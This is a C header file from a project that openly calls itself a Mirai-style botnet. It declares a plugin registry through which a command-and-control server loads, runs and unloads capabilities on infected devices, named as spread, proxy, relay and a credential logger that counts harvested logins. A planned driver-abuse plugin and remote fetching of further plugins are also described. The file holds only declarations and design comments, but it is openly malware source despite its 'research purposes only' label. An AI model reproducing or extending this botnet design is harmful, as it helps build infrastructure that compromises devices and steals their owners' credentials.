/*
 * notnet - Modern Mirai-Style Botnet
 * plugin.h - Loader/plugin framework (#92)
 *
 * The Bredolab/Emotet split: the core bot stays a minimal loader and
 * capabilities are pushed post-infection, dispatched by name from the
 * C2. v1 implements the built-in plugin registry — spread, proxy,
 * relay, and cred-log are compile-time linked plugins whose lifecycle
 * the C2 manages via the `plugin` command. Remote fetch of
 * shared-object plugins (dlopen) is planned future work and must reuse
 * the fail-closed SHA-256 pinning of the payload path (payload_sha256).
 *
 * Research purposes only.
 */
#ifndef NOTNET_PLUGIN_H
#define NOTNET_PLUGIN_H

#include "protocol.h"

/* ── Plugin Registry (#92) ─────────────────────────────────── */
/* Fixed-size registry of built-in plugins. Each entry has a dispatch
 * name, human-readable metadata, and load/run/unload callbacks. In v1
 * every plugin is compile-time linked into the binary, so `load` only
 * flips registry state and runs the (usually no-op) load callback;
 * `run` executes the capability (e.g. proxy_start for the proxy) and
 * `unload` tears it down. The registry caps live in include/config.h
 * (PLUGIN_MAX_REGISTRY / PLUGIN_NAME_MAX). */
typedef struct notnet_plugin {
    const char *name;                /* dispatch name, e.g. "proxy" */
    const char *description;         /* metadata, shown by `plugin status` */
    int (*load)(notnet_bot_t *bot);  /* prepare; 0 on success, -1 on failure */
    int (*run)(notnet_bot_t *bot);   /* execute capability; 0/-1 */
    int (*unload)(notnet_bot_t *bot);/* teardown; 0/-1 */
    int loaded;                      /* 1 = loaded, 0 = unloaded */
} notnet_plugin_t;

/* Register the compile-time built-in plugins into the fixed registry.
 * Idempotent; call once at boot. */
void plugin_init(void);

/* Boot: mark every built-in plugin loaded (they are compile-time
 * linked) by running its load callback. Plugins whose load callback
 * fails (e.g. the planned-but-unimplemented byovd entry) stay
 * unloaded. */
void plugin_load_all(notnet_bot_t *bot);

/* Look up a plugin by dispatch name; NULL when unknown. */
notnet_plugin_t *plugin_find(const char *name);

/* Lifecycle ops, all by name. Return 0 on success, -1 on failure
 * (unknown name, wrong state, or callback failure). */
int plugin_load(notnet_bot_t *bot, const char *name);
int plugin_run(notnet_bot_t *bot, const char *name);
int plugin_unload(notnet_bot_t *bot, const char *name);

/* Teardown every loaded plugin via its unload (stop) callback —
 * used by the `kill` command (#93) to hand back capacity. */
void plugin_unload_all(notnet_bot_t *bot);

/* Render the registry listing into buf (multi-line, bounded). Each
 * line: "[*|<space>] <name> <description>" — '*' marks a loaded
 * plugin. The cred-log line also reports the buffered harvest count. */
void plugin_status(char *buf, size_t len);

/* Registry stats (for boot logging). */
int plugin_count(void);
int plugin_loaded_count(void);

#endif /* NOTNET_PLUGIN_H */
